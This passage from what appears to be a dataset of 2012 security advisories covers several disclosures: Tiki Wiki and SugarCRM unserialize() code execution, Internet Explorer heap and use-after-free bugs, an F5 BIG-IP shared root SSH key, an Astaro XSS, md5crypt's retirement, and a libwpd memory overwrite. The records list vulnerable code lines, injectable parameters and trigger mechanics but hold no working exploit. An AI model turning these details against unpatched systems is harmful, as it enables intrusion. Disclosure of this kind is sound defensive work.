fraction and pid is the process identifier.
Both the TXID and source port are generated by this PRNG.
Since both calls occur subsequently, the values are very much correlated
to each other. This yields a feasible attack expected time as we show
that the number of
random bits is brought down from 32 (ideally) to less than 21.
Check our advisory for full details.
3 Vulnerable versions
================
Android 4.0.4 and below.
4 Vendor Response
===============
Android 4.1.1 has been released, and patches are available on AOSP. The random
sample is now pulled from /dev/urandom, which should have adequate entropy by
the time network activity occurs.
5 Identifier
========
CVE-2012-2808
6 Discovered by
============
Roee Hay & Roi Saltzman
IBM Application Security Research Group
7 Disclosure timeline
================
07/24/2012 Public disclosure
06/05/2012 Issue confirmed by Android Security Team and patch provided
to partners.
05/21/2012 Disclosed to Android Security Team."
10090,"[CVE-2012-0911] Tiki Wiki CMS Groupware <= 8.3 ""unserialize()"" PHP Code Execution",,CVE-2012-0911,"-----------------------------------------------------------------
Tiki Wiki CMS Groupware <= 8.3 ""unserialize()"" PHP Code Execution
-----------------------------------------------------------------
author...........: Egidio Romano aka EgiX
mail.............: n0b0d13s[at]gmail[dot]com
software link....: http://info.tiki.org/
[-] Vulnerable code in different locations:
lib/banners/bannerlib.php:28: $views = unserialize($_COOKIE[$cookieName]);
lib/banners/bannerlib.php:136: $views = unserialize($_COOKIE[$cookieName]);
tiki-print_multi_pages.php:19: $printpages = unserialize(urldecode($_REQUEST['printpages']));
tiki-print_multi_pages.php:24: $printstructures = unserialize(urldecode($_REQUEST['printstructures']));
tiki-print_pages.php:31: $printpages = unserialize(urldecode($_REQUEST[""printpages""]));
tiki-print_pages.php:32: $printstructures = unserialize(urldecode($_REQUEST['printstructures']));
tiki-send_objects.php:42: $sendpages = unserialize(urldecode($_REQUEST['sendpages']));
tiki-send_objects.php:48: $sendstructures = unserialize(urldecode($_REQUEST['sendstructures']));
tiki-send_objects.php:54: $sendarticles = unserialize(urldecode($_REQUEST['sendarticles']));
The vulnerability is caused due to all these scripts using ""unserialize()"" with user controlled input.
This can lead to execution of arbitrary PHP code passing an ad-hoc Zend Framework serialized object.
[-] Full path disclosure at:
http://[host]/[path]/admin/include_calendar.php
http://[host]/[path]/tiki-rss_error.php
http://[host]/[path]/tiki-watershed_service.php
[-] Disclosure timeline:
[11/01/2012] - Vulnerability discovered
[14/01/2012] - Issue reported to security(at)tikiwiki.org
[14/01/2012] - New ticket opened: http://dev.tiki.org/item4109
[23/01/2012] - CVE number requested
[23/01/2012] - Assigned CVE-2012-0911
[01/05/2012] - Version 8.4 released: http://info.tiki.org/article191-Tiki-Releases-8-4
[04/07/2012] - Public disclosure
[-] Proof of concept:
http://www.exploit-db.com/exploits/19573/"
10142,"[CVE-2012-0694] SugarCRM CE <= 6.3.1 ""unserialize()"" PHP Code Execution",,CVE-2012-0694,"-------------------------------------------------------
SugarCRM CE <= 6.3.1 ""unserialize()"" PHP Code Execution
-------------------------------------------------------
author...........: Egidio Romano aka EgiX
mail.............: n0b0d13s[at]gmail[dot]com
software link....: http://www.sugarcrm.com/
[-] Vulnerable code in different locations:
include/export_utils.php:377: $searchForm->populateFromArray(unserialize(base64_decode($query)));
include/generic/Save2.php:197: $current_query_by_page_array = unserialize(base64_decode($current_query_by_page));
include/MVC/Controller/SugarController.php:593: $_REQUEST = unserialize(base64_decode($temp_req['current_query_by_page']));
include/MVC/View/views/view.list.php:82: $current_query_by_page = unserialize(base64_decode($_REQUEST['current_query_by_page']));
modules/Import/Importer.php:536: $firstrow = unserialize(base64_decode($_REQUEST['firstrow']));
modules/ProjectTask/views/view.list.php:95: $current_query_by_page = unserialize(base64_decode($_REQUEST['current_query_by_page']));
The vulnerability is caused due to all these scripts using ""unserialize()"" with user controlled input.
This can be exploited to e.g. execute arbitrary PHP code via the ""__destruct()"" method of the ""SugarTheme""
class, passing an ad-hoc serialized object through the $_REQUEST['current_query_by_page'] input variable.
[-] Disclosure timeline:
[31/10/2011] - Vulnerability discovered
[05/11/2011] - Vendor notified to secure(at)sugarcrm.com
[25/11/2011] - Vendor notified to http://www.sugarcrm.com/forums/f22/critical-security-vulnerability-76537/
[07/12/2011] - Vendor fix the issue on his own within 6.4.0 RC1 release
[10/01/2012] - CVE number requested
[12/01/2012] - Assigned CVE-2012-0694
[06/02/2012] - Issue addressed within 6.4.0 version
[23/06/2012] - Public disclosure
[-] Proof of concept:
http://www.exploit-db.com/exploits/19381/"
10179,"VUPEN Security Research - Microsoft Internet Explorer ""Col"" Element Remote Heap Overflow (MS12-037 / CVE-2012-1876)",,CVE-2012-1876,"VUPEN Security Research - Microsoft Internet Explorer ""Col"" Element Remote Heap Overflow (MS12-037 / CVE-2012-1876)
Website : http://www.vupen.com/english/research.php
Twitter : http://twitter.com/vupen
I. BACKGROUND
---------------------
""Microsoft Internet Explorer is a web browser developed by Microsoft and
included as part of the Microsoft Windows line of operating systems with
more than 60% of the worldwide usage share of web browsers."" (Wikipedia)
II. DESCRIPTION
---------------------
VUPEN Vulnerability Research Team discovered a critical vulnerability
in Microsoft Internet Explorer.
The vulnerability is caused by a heap overflow error in the mshtml.dll
module when processing ""Col"" elements, which could allow remote attackers
to leak memory and execute arbitrary code despite ASLR and DEP.
CVSS Score: 10 (AV:N/AC:L/Au:N/C:C/I:C/A:C)
III. AFFECTED PRODUCTS
---------------------------
Microsoft Internet Explorer 10
Microsoft Internet Explorer 9
Microsoft Internet Explorer 8
Microsoft Internet Explorer 7
Microsoft Internet Explorer 6
Microsoft Windows 8 for 32-bit Systems
Microsoft Windows 8 for x64-based Systems
Microsoft Windows 7 for 32-bit Systems
Microsoft Windows 7 for 32-bit Systems Service Pack 1
Microsoft Windows 7 for x64-based Systems
Microsoft Windows 7 for x64-based Systems Service Pack 1
Microsoft Windows Server 2008 for 32-bit Systems
Microsoft Windows Server 2008 for 32-bit Systems Service Pack 2
Microsoft Windows Server 2008 for x64-based Systems
Microsoft Windows Server 2008 for x64-based Systems Service Pack 2
Microsoft Windows Server 2008 for Itanium-based Systems
Microsoft Windows Server 2008 for Itanium-based Systems Service Pack 2
Microsoft Windows Server 2008 R2 for x64-based Systems
Microsoft Windows Server 2008 R2 for x64-based Systems Service Pack 1
Microsoft Windows Server 2008 R2 for Itanium-based Systems
Microsoft Windows Server 2008 R2 for Itanium-based Systems Service Pack 1
Microsoft Windows Vista Service Pack 1
Microsoft Windows Vista Service Pack 2
Microsoft Windows Vista x64 Edition Service Pack 1
Microsoft Windows Vista x64 Edition Service Pack 2
Microsoft Windows Server 2003 Service Pack 2
Microsoft Windows Server 2003 x64 Edition Service Pack 2
Microsoft Windows Server 2003 with SP2 for Itanium-based Systems
Microsoft Windows XP Service Pack 3
Microsoft Windows XP Professional x64 Edition Service Pack 2
IV. Binary Analysis & Exploits/PoCs
---------------------------------------
In-depth technical analysis of the vulnerability and a functional exploit
including ASLR and DEP bypass are available through the VUPEN BAE
(Binary Analysis & Exploits) portal:
http://www.vupen.com/english/services/ba-index.php
VUPEN Binary Analysis & Exploits Service provides private exploits and
in-depth technical analysis of the most significant public vulnerabilities
based on disassembly, reverse engineering, protocol analysis, and code audit.
The service allows governments and major corporations to evaluate risks, and
protect infrastructures and assets against new threats. The service also
allows security vendors (IPS, IDS, AntiVirus) to supplement their internal
research efforts and quickly develop both vulnerability-based and
exploit-based signatures to proactively protect their customers from attacks
and emerging threats.
V. VUPEN Threat Protection Program
-----------------------------------
Governments and major corporations which are members of the VUPEN Threat
Protection Program (TPP) have been proactively alerted about the vulnerability
when it was discovered by VUPEN in advance of its public disclosure, and
have received a detailed attack detection guidance to protect national and
critical infrastructures against potential 0-day attacks exploiting this
vulnerability:
http://www.vupen.com/english/services/tpp-index.php
VI. SOLUTION
----------------
Apply MS12-037 security update.
VII. CREDIT
--------------
This vulnerability was discovered by Alexandre Pelletier of VUPEN Security
VIII. ABOUT VUPEN Security
---------------------------
VUPEN is the leadering provider of advanced vulnerability research for
defensive and offensive cyber security. VUPEN solutions enable corporations
and governments to measure and manage risks, eliminate vulnerabilities
before they can be exploited, and protect critical infrastructures and
assets against known and unknown vulnerabilities.
VUPEN has been recognized as ""Company of the Year 2011 in the Vulnerability
Research Market"" by Frost & Sullivan.
VUPEN has been recognized as ""Company of the Year 2011 in the Vulnerability
Research Market"" by Frost & Sullivan.
VUPEN solutions include:
* VUPEN Binary Analysis & Exploits Service (BAE) :
http://www.vupen.com/english/services/ba-index.php
* VUPEN Threat Protection Program (TPP) :
http://www.vupen.com/english/services/tpp-index.php
IX. REFERENCES
----------------------
http://technet.microsoft.com/en-us/security/bulletin/ms12-037
http://www.vupen.com/english/research.php
X. DISCLOSURE TIMELINE
-----------------------------
2012-02-02 - Vulnerability Discovered by VUPEN and used at Pwn2own
2012-06-12 - Public disclosure"
10180,"VUPEN Security Research - Microsoft Internet Explorer ""GetAtomTable"" Remote Use-after-free (MS12-037 / CVE-2012-1875)",,CVE-2012-1875,"VUPEN Security Research - Microsoft Internet Explorer ""GetAtomTable"" Remote Use-after-free (MS12-037 / CVE-2012-1875)
Website : http://www.vupen.com/english/research.php
Twitter : http://twitter.com/vupen
I. BACKGROUND
---------------------
""Microsoft Internet Explorer is a web browser developed by Microsoft and
included as part of the Microsoft Windows line of operating systems with
more than 60% of the worldwide usage share of web browsers."" (Wikipedia)
II. DESCRIPTION
---------------------
VUPEN Vulnerability Research Team discovered a critical vulnerability
in Microsoft Internet Explorer.
The vulnerability is caused by a use-after-free error in the mshtml.dll
module when processing GetAtomTable objects, which could allow remote
attackers to leak memory and execute arbitrary code despite ASLR and DEP.
CVSS Score: 10 (AV:N/AC:L/Au:N/C:C/I:C/A:C)
III. AFFECTED PRODUCTS
---------------------------
Microsoft Internet Explorer 8
Microsoft Windows XP Service Pack 3
Microsoft Windows XP Professional x64 Edition Service Pack 2
Microsoft Windows Server 2003 Service Pack 2
Microsoft Windows Server 2003 x64 Edition Service Pack 2
Microsoft Windows Server 2003 with SP2 for Itanium-based Systems
Microsoft Windows Vista Service Pack 1
Microsoft Windows Vista Service Pack 2
Microsoft Windows Vista x64 Edition Service Pack 1
Microsoft Windows Vista x64 Edition Service Pack 2
Microsoft Windows Server 2008 for 32-bit Systems
Microsoft Windows Server 2008 for 32-bit Systems Service Pack 2
Microsoft Windows Server 2008 for x64-based Systems
Microsoft Windows Server 2008 for x64-based Systems Service Pack 2
Microsoft Windows Server 2008 for Itanium-based Systems
Microsoft Windows Server 2008 for Itanium-based Systems Service Pack 2
Microsoft Windows 7 for 32-bit Systems
Microsoft Windows 7 for 32-bit Systems Service Pack 1
Microsoft Windows 7 for x64-based Systems
Microsoft Windows 7 for x64-based Systems Service Pack 1
Microsoft Windows Server 2008 R2 for x64-based Systems
Microsoft Windows Server 2008 R2 for x64-based Systems Service Pack 1
Microsoft Windows Server 2008 R2 for Itanium-based Systems
Microsoft Windows Server 2008 R2 for Itanium-based Systems Service Pack 1
IV. Binary Analysis & Exploits/PoCs
---------------------------------------
In-depth technical analysis of the vulnerability and a functional exploit
including ASLR and DEP bypass are available through the VUPEN BAE
(Binary Analysis & Exploits) portal:
http://www.vupen.com/english/services/ba-index.php
VUPEN Binary Analysis & Exploits Service provides private exploits and
in-depth technical analysis of the most significant public vulnerabilities
based on disassembly, reverse engineering, protocol analysis, and code audit.
The service allows governments and major corporations to evaluate risks, and
protect infrastructures and assets against new threats. The service also
allows security vendors (IPS, IDS, AntiVirus) to supplement their internal
research efforts and quickly develop both vulnerability-based and
exploit-based signatures to proactively protect their customers from attacks
and emerging threats.
V. VUPEN Threat Protection Program
-----------------------------------
Governments and major corporations which are members of the VUPEN Threat
Protection Program (TPP) have been proactively alerted about the vulnerability
when it was discovered by VUPEN in advance of its public disclosure, and
have received a detailed attack detection guidance to protect national and
critical infrastructures against potential 0-day attacks exploiting this
vulnerability:
http://www.vupen.com/english/services/tpp-index.php
VI. SOLUTION
----------------
Apply MS12-037 security update.
VII. CREDIT
--------------
This vulnerability was discovered by Jordan Gruskovnjak of VUPEN Security
VIII. ABOUT VUPEN Security
---------------------------
VUPEN is the leadering provider of advanced vulnerability research for
defensive and offensive cyber security. VUPEN solutions enable corporations
and governments to measure and manage risks, eliminate vulnerabilities
before they can be exploited, and protect critical infrastructures and
assets against known and unknown vulnerabilities.
VUPEN has been recognized as ""Company of the Year 2011 in the Vulnerability
Research Market"" by Frost & Sullivan.
VUPEN has been recognized as ""Company of the Year 2011 in the Vulnerability
Research Market"" by Frost & Sullivan.
VUPEN solutions include:
* VUPEN Binary Analysis & Exploits Service (BAE) :
http://www.vupen.com/english/services/ba-index.php
* VUPEN Threat Protection Program (TPP) :
http://www.vupen.com/english/services/tpp-index.php
IX. REFERENCES
----------------------
http://technet.microsoft.com/en-us/security/bulletin/ms12-037
http://www.vupen.com/english/research.php
X. DISCLOSURE TIMELINE
-----------------------------
2012-04-03 - Vulnerability Discovered by VUPEN and shared with customers
2012-06-12 - Public disclosure"
10241,[MATTA-2012-002] CVE-2012-1493; F5 BIG-IP remote root authentication bypass Vulnerability,,CVE-2012-1493,"Matta Consulting - Matta Advisory
https://www.trustmatta.com
F5 BIG-IP remote root authentication bypass Vulnerability
Advisory ID: MATTA-2012-002
CVE reference: CVE-2012-1493
Affected platforms: BIG-IP platforms without SCCP
Version: 11.x 10.x 9.x
Date: 2012-February-16
Security risk: High
Vulnerability: F5 BIG-IP remote root authentication bypass
Researcher: Florent Daigniere
Vendor Status: Notified / Patch available
Vulnerability Disclosure Policy:
https://www.trustmatta.com/advisories/matta-disclosure-policy-01.txt
Permanent URL:
https://www.trustmatta.com/advisories/MATTA-2012-002.txt
=====================================================================
Description:
Vulnerable BIG-IP installations allow unauthenticated users to bypass
authentication and login as the 'root' user on the device.
The SSH private key corresponding to the following public key is
public and present on all vulnerable appliances:
ssh-rsa
AAAAB3NzaC1yc2EAAAABIwAAAIEAvIhC5skTzxyHif/7iy3yhxuK6/OB13hjPqrskogkYFrcW8OK4VJT+5+Fx7wd4sQCnVn8rNqahw/x6sfcOMDI/Xvn4yKU4t8TnYf2MpUVr4ndz39L5Ds1n7Si1m2suUNxWbKv58I8+NMhlt2ITraSuTU0NGymWOc8+LNi+MHXdLk= SCCP Superuser
Its fingerprint is:
71:3a:b0:18:e2:6c:41:18:4e:56:1e:fd:d2:49:97:66
=====================================================================
Impact
If successful, a malicious third party can get full control of the
device with little to no effort. The Attacker might reposition and
launch an attack against other parts of the target infrastructure
from there.
=====================================================================
Versions affected:
BIG-IP version 11.1.0 build 1943.0 tested.
The vendor reports that the following versions are patched:
9.4.8-HF5 and later
10.2.4 and later
11.0.0-HF2 and later
11.1.0-HF3 and later
http://support.f5.com/kb/en-us/solutions/public/13000/600/sol13600.html
=====================================================================
Credits
This vulnerability was discovered and researched by Florent Daigniere
from Matta Consulting.
=====================================================================
History
16-02-12 initial discovery
22-02-12 initial attempt to contact the vendor
24-02-12 reply from David Wang, case C1062228 is open
24-02-12 draft of the advisory sent to the vendor
01-03-12 CVE-2012-1493 is assigned
06-04-12 James Affeld starts coordinating the notification effort
23-05-12 F5 notifies us that patches are ready
29-05-12 F5 sends advance notification to some customers
06-06-12 Public disclosure
=====================================================================
About Matta
Matta is a privately held company with Headquarters in London, and a
European office in Amsterdam. Established in 2001, Matta operates
in Europe, Asia, the Middle East and North America using a respected
team of senior consultants. Matta is an accredited provider of
Tiger Scheme training; conducts regular research and is the developer
behind the webcheck application scanner, and colossus network scanner.
https://www.trustmatta.com
https://www.trustmatta.com/training.html
https://www.trustmatta.com/webapp_va.html
https://www.trustmatta.com/network_va.html
=====================================================================
Disclaimer and Copyright
Copyright (c) 2012 Matta Consulting Limited. All rights reserved.
This advisory may be distributed as long as its distribution is
free-of-charge and proper credit is given.
The information provided in this advisory is provided ""as is"" without
warranty of any kind. Matta Consulting disclaims all warranties, either
express or implied, including the warranties of merchantability and
fitness for a particular purpose. In no event shall Matta Consulting or
its suppliers be liable for any damages whatsoever including direct,
indirect, incidental, consequential, loss of business profits or
special damages, even if Matta Consulting or its suppliers have been
advised of the possibility of such damages."
10243,[CVE-2012-3238] Astaro Security Gateway <= v8.304 Persistent Cross-Site Scripting Vulnerability,,CVE-2012-3238,"Inshell Security Advisory
http://www.inshell.net/
1. ADVISORY INFORMATION
-----------------------
Product: Astaro Security Gateway
Vendor URL: www.astaro.com / www.sophos.com
Type: Cross-site Scripting [CWE-79]
Date found: 2012-05-11
Date published: 2012-06-10
CVSSv2 Score: 3,5 (AV:N/AC:M/Au:S/C:N/I:P/A:N)
CVE: CVE-2012-3238
2. CREDITS
----------
This vulnerability was discovered and researched by Julien Ahrens from
Inshell Security.
3. VERSIONS AFFECTED
--------------------
Astaro Security Gateway v8.304, older versions are affected too.
4. VULNERABILITY DESCRIPTION
----------------------------
A Persistent Cross-Site Scripting Vulnerability has been found on the
Astaro Security Gateway product.
The vulnerability is located in the backup-function of the software:
Vulnerable Module(s):
+Management -> Backup/Restore
Parameter: ""Comment (optional)""
The input field ""Comment (optional)"" is shown on the ""Available backups""
view after successful creation of a new backup and is also included into
the backup-file itself.
Due to improper input - validation of this input field, an attacker
could permanently inject arbitrary code with required user interaction
into the context of the firewall-interface. Successful exploitation of
the vulnerability allows for example cookie theft, session hijacking or
server side context manipulation.
5. PROOF-OF-CONCEPT (CODE / EXPLOIT)
------------------------------------
An attacker needs to force the victim to import an arbitrary
backup-file. The victim does not need to apply the backup, only the
import is required to exploit the vulnerability.
For further information (screenshots, PoCs etc.) visit:
http://security.inshell.net/advisory/27
6. SOLUTION
-----------
Update to v8.305.
7. REPORT TIMELINE
------------------
2012-05-12: Initial notification sent to vendor
2012-05-12: Vendor response
2012-05-12: Vulnerability details reported to vendor
2012-05-15: Vendor acknowledgement
2012-05-31: Vendor releases Update / Fix
2012-06-10: Coordinated public release of advisory
8. REFERENCES
-------------
http://www.astaro.com/en-uk/blog/up2date/8305
http://security.inshell.net"
10247,Re: CVE-2012-3287: md5crypt is no longer considered safe,,CVE-2012-3287,"On Fri, Jun 08, 2012 at 12:04:49AM +0000, phk FreeBSD org wrote:
> The LinkedIn password incompetence has resulted in a number of ""just use md5crypt and you'll be fine"" pieces of advice on the net.
>
> Since I no longer consider this to be the case, I have issued an official statement, as the author of md5crypt, to the opposite effect:
>
> http://phk.freebsd.dk/sagas/md5crypt_eol.html
>
> Please find something better now.
Thank you for posting this - it was interesting to learn of your opinion
on the matter after all those years! Ditto re: ""The history of md5crypt"":
http://phk.freebsd.dk/sagas/md5crypt.html
Now, since some people are in fact still using md5crypt, they'll think
of what to move to. You almost recommend them to roll their own - a
recommendation I disagree with (as we've already discussed off-list).
The main options are bcrypt and SHA-crypt. Many would recommend scrypt
instead - for good reasons - but there's no crypt(3) interface for it
yet, also for good reasons, e.g.:
http://www.openwall.com/lists/crypt-dev/2011/05/12/4
Personally, I think that bcrypt and SHA-crypt are quite close to
becoming obsolete in favor of something new, yet right now I would still
recommend moving to bcrypt as the most suitable pre-existing password
hashing method. So if you're to move to something ""temporary"" at all,
better move to a password hashing method already in use - and for now
this should be bcrypt - than roll your own. (My opinion only, indeed.
Someone else may disagree.)
What's wrong with bcrypt, though? Mainly two things, I think:
1. Not enough natural parallelism in one instance (so that it could be
made use of by an authentication server and not only by an attacker,
who always has plenty of parallelism due to having lots of candidate
passwords to try). I started complaining about this around 1998, but
this problem was not pressing enough to introduce yet another password
hashing method so far. The speedup from extra parallelism available to
attacker only is up to a factor of 2 on typical CPUs so far (due to
instruction level parallelism only, but not SIMD). However, I expect
this to change with AVX2 VSIB addressing (gather) next year, which
appears to allow for parallel computation of 8 bcrypt hashes in 256-bit
vectors - by attacker only. There may be fewer vector units than ALUs,
though, so the speedup over what the attacker currently has (already up
to 2x faster than defender) will likely be significantly less than 8x.
2. The memory requirement of 4 KB is not configurable and is rather
low - barely enough to defeat GPUs so far, but this may change, and
there may be other hardware-based attacks. So far, experimental John
the Ripper patches by Sayantan Datta achieve CPU-like performance at
bcrypt on AMD Radeon HD 7970 (we have to either use the slow global
memory or explicitly heavily under-utilize the GPU's computing resources
so that the smaller number of concurrent bcrypt computations fits in
local memory), but there's room for improvement:
http://www.openwall.com/lists/john-dev/2012/06/06/1
(The c/s rates are for $2a$05, used as baseline for historical reasons;
for comparison, AMD FX-8120 CPU provides approx. 5400 c/s at that setting,
which is slightly faster than the GPU so far.) I expect that
significant speedup over CPU may be demonstrated soon (just not as
significant as it is for MD5, etc.) Here are some very rough estimates
for the potential speedup:
http://www.openwall.com/lists/john-dev/2012/05/14/1
What's wrong with SHA-crypt? It's similar, but worse:
1. Not enough natural parallelism in one instance. Well, at least it
uses 64-bit integers (the flavor based on SHA-512), whereas bcrypt is
32-bit only, but on the other hand in addition to extra instruction
level parallelism while cracking we can also use SIMD (on current CPUs
already, even though this is not implemented yet).
2. Almost no memory requirements. The register pressure is a bit high
for GPUs, but not to the point where GPUs would not provide an advantage.
So far, SHA-crypt at its default rounds=5000 is crackable on a GPU at
more than 10x the speed of bcrypt at comparable settings ($2a$08, which
is default on some systems), due to John the Ripper patch by Claudio Andre:
http://www.openwall.com/presentations/PHDays2012-Password-Security/mgp00037.html
Thus, out of these two bcrypt wins, and the rest are either worse or not
yet ready for end-user consumption (sysadmin, web app author, etc.)
<plug>
(OK, I already plugged some links to openwall.com pages above, but this
is getting too much, hence the tags.)
I made a talk on this topic at PHDays last week. Here are the slides:
http://www.openwall.com/presentations/PHDays2012-Password-Security/
I give some historical background on password security with focus on
password hashing (1960s to 2012), and then in the last 9 slides I share
some thoughts on the future:
Desirable properties of a future KDF
KDFs unfriendly to hardware we do not have
CPU + RAM friendliness
GPU friendliness
FPGA/ASIC friendliness
Local parameter
Unreadable local parameter
KDFs in scripting languages (future phpass)
Need to resist the temptation
<shameless>
Companies with large user databases (like LinkedIn's) and adequate IT
security budgets could use this approach (on top of other measures):
http://www.openwall.com/presentations/PHDays2012-Password-Security/mgp00050.html
(Move password hashing to HSMs or to servers separate from password
authentication servers, store a local parameter there.) We (Openwall)
would be happy to help these companies implement that (and more).
</shameless>
</plug>
Alexander"
10255,CVE-2012-3287: md5crypt is no longer considered safe,,CVE-2012-3287,"The LinkedIn password incompetence has resulted in a number of ""just use md5crypt and you'll be fine"" pieces of advice on the net.
Since I no longer consider this to be the case, I have issued an official statement, as the author of md5crypt, to the opposite effect:
http://phk.freebsd.dk/sagas/md5crypt_eol.html
Please find something better now.
Thanks for using my code.
Poul-Henning Kamp"
10321,[CVE-2012-2098] Apache Commons Compress and Apache Ant denial of service vulnerability,,CVE-2012-2098,
10336,SEC Consult SA-20120518 :: Memory overwrite vulnerability in libwpd (OpenOffice.org) - CVE-2012-2149,,CVE-2012-2149,"SEC Consult Vulnerability Lab Security Advisory < 20120518-0 >
=======================================================================
title: libwpd WPXContentListener::_closeTableRow() memory
overwrite
product: OpenOffice.org
vulnerable version: 3.3.0/3.4 Beta 1 and probably earlier versions
fixed version: 3.4
CVE: CVE-2012-2149
impact: high
homepage: http://www.openoffice.org/
found: 2011-09-01
by: K. Gudinavicius
SEC Consult Vulnerability Lab
https://www.sec-consult.com
=======================================================================
Vendor description:
-------------------
""OpenOffice.org 3 is the leading open-source office software suite for
word processing, spreadsheets, presentations, graphics, databases and
more. It is available in many languages and works on all common
computers.""
Source: http://why.openoffice.org/
Vulnerability overview/description:
-----------------------------------
OpenOffice.org includes the customized libwpd version 0.8.8 library for
parsing WordPerfect documents. The used version of the libwpd library
suffers from a memory overwrite vulnerability when reading a specially
crafted WPD file. Successful exploitation of this vulnerability could
result in an arbitrary code execution within the OpenOffice.org
software suite.
Proof of concept:
-----------------
The vulnerability resides in the WPXContentListener::_closeTableRow()
function which is declared in the WPXContentListener.cpp file. The
function doesn't check if the variable's m_ps->m_currentTableCol value
is less than zero before entering the while loop which leads to an
integer overflow and decrementation of the memory location pointed by
m_ps->m_numRowsToSkip[m_ps->m_currentTableCol] address if the
conditions are met. Related code excerpt:
void WPXContentListener::_closeTableRow()
{
if (m_ps->m_isTableRowOpened)
{
while ((long)m_ps->m_currentTableCol <
(long)m_ps->m_numRowsToSkip.size()) {
if
(!m_ps->m_numRowsToSkip[m_ps->m_currentTableCol]) {
RGBSColor tmpCellBorderColor(0x00,
0x00, 0x00, 0x64); _openTableCell(1, 1, 0xFF, 0, 0,
&tmpCellBorderColor, TOP); _closeTableCell();
}
else
m_ps->m_numRowsToSkip[m_ps->m_currentTableCol++]--;
}
if (m_ps->m_isTableCellOpened)
_closeTableCell();
m_listenerImpl->closeTableRow();
}
m_ps->m_isTableRowOpened = false;
}
The variable's m_ps->m_currentTableCol value can be influenced by
calling WPXContentListener::_closeTable() function which sets its value
to -1 after the call to WPXContentListener::_openTableRow() function.
Calling the _openTableRow() function again results in
WPXContentListener::_closeTableRow() being called and the memory
location pointed by the m_ps->m_numRowsToSkip[-1] address is being
decremented.
It was possible to build a specially crafted WPD file containing byte
sequences that represent the above mentioned functions to decrement
valid C++ object's pointer as many times as it needed to achieve
arbitrary code execution when virtual functions of that object were
called. The exploit code will not be published.
Debugger output:
Breakpoint 0 hit
eax=070fcbd4 ebx=00000000 ecx=ffffffff edx=0ebd25f0 esi=0185c928
edi=0185c920 eip=0eb9167e esp=0185c860 ebp=0185c86c iopl=0 nv
up ei pl zr ac pe nc cs=001b ss=0023 ds=0023 es=0023 fs=003b
gs=0000 efl=00000256 wpftmi!component_getFactory+0x20355:
0eb9167e ff08 dec dword ptr [eax]
ds:0023:070fcbd4=0ebdb288 0:000> g
Breakpoint 0 hit
eax=070fcbd4 ebx=00000000 ecx=ffffffff edx=0ebd25f0 esi=0185c928
edi=0185c920 eip=0eb9167e esp=0185c860 ebp=0185c86c iopl=0 nv
up ei pl zr ac pe nc cs=001b ss=0023 ds=0023 es=0023 fs=003b
gs=0000 efl=00000256 wpftmi!component_getFactory+0x20355:
0eb9167e ff08 dec dword ptr [eax]
ds:0023:070fcbd4=0ebdb287 0:000> g
Breakpoint 0 hit
eax=070fcbd4 ebx=00000000 ecx=ffffffff edx=0ebd25f0 esi=0185c928
edi=0185c920 eip=0eb9167e esp=0185c860 ebp=0185c86c iopl=0 nv
up ei pl zr ac pe nc cs=001b ss=0023 ds=0023 es=0023 fs=003b
gs=0000 efl=00000256 wpftmi!component_getFactory+0x20355:
0eb9167e ff08 dec dword ptr [eax]
ds:0023:070fcbd4=0ebdb286 0:000> g
Breakpoint 0 hit
eax=070fcbd4 ebx=00000000 ecx=ffffffff edx=0ebd25f0 esi=0185c928
edi=0185c920 eip=0eb9167e esp=0185c850 ebp=0185c85c iopl=0 nv
up ei pl zr ac pe nc cs=001b ss=0023 ds=0023 es=0023 fs=003b
gs=0000 efl=00000256 wpftmi!component_getFactory+0x20355:
0eb9167e ff08 dec dword ptr [eax]
ds:0023:070fcbd4=0ebdb285 <...>
Vulnerable / tested versions:
-----------------------------
The vulnerability has been verified to exist in versions 3.3.0 and
3.4 Beta 1 of OpenOffice.org, which were the most recent versions at
the time of discovery.
Vendor contact timeline:
------------------------
2011-09-19: Contacting vendor through securityteam openoffice org
2011-09-21: Vendor response, clarification request
2011-09-21: Sent answer
2011-10-05: Vendor response, clarification request
2011-10-05: Sent answer
2011-10-13: Contacted vendor asking for status
2011-11-23: Contacted vendor asking for status
2011-11-23: Vendor response, project moved to Apache
2011-11-24: Contacting vendor through ooo-security incubator apache org
2011-12-05: Contacted vendor asking for status
2011-12-05: Vendor response
2012-01-09: Contacted vendor asking for status
2012-01-09: Vendor response, Apache OpenOffice 3.4 release is planned
in Q1 2012.
2012-03-22: Contacted vendor asking for status
2012-04-19: Contacted vendor asking for status
2012-04-23: Vendor response
2012-04-24: Contacted vendor asking for CVE#
2012-04-30: Vendor response including CVE#
2012-05-07: Contacted vendor asking for status
2012-05-07: Vendor response, date of the release announcement for
OpenOffice 3.4
2012-05-07: Vendor releases Apache OpenOffice 3.4
2012-05-16: Vendor releases security bulletin which addresses this
vulnerability
2012-05-18: SEC Consult releases detailed advisory
Solution:
---------
OpenOffice.org 3.3.0 and 3.4 beta users should upgrade to Apache
OpenOffice 3.4.
Workaround:
-----------
Untrusted WPD documents should be avoided.
Advisory URL:
-------------
https://www.sec-consult.com/en/advisories.html
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
SEC Consult Unternehmensberatung GmbH
Office Vienna
Mooslackengasse 17
A-1190 Vienna
Austria
Tel.: +43 / 1 / 890 30 43 - 0
Fax.: +43 / 1 / 890 30 43 - 25
Mail: research at sec-consult dot com
https://www.sec-consult.com
EOF K. Gudinavicius / @2012"
10349,CVE-2012-2149 OpenOffice.org memory overwrite vulnerability,,CVE-2012-2149,"-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA512
CVE-2012-2149 OpenOffice.org memory overwrite vulnerability
Reference: http://www.openoffice.org/security/cves/CVE-2012-2149.html
Severity: Important
Vendor: The Apache Software Foundation
Versions Affected:
OpenOffice.org 3.3 and 3.4 Beta, on all platforms.
Earlier versions may be also affected.
Description:
Effected versions of OpenOffice.org use a customized libwpd that has a
memory overwrite vulnerability that could be exploited by a specially
crafted Wordperfect WPD-format document, potentially leading to
arbitrary-code execution at application user privilege level.
Mitigation
OpenOffice.org 3.3.0 and 3.4 beta users are advised to upgrade to
Apache OpenOffice 3.4, where WPD files are ignored. Users who are
unable to upgrade immediately should be cautious when opening
untrusted WPD documents.
Credits
The Apache OpenOffice Security Team acknowledges Kestutis Gudinavicius
of SEC Consult Unternehmensberatung GmbH as the discoverer of this flaw.
-----BEGIN PGP SIGNATURE-----
Version: GnuPG v1.4.11 (GNU/Linux)
iQIcBAEBCgAGBQJPs8AeAAoJEGFAoYdHzLzHpw4P/3hRQxaIre8XARxy9JiT+HX3
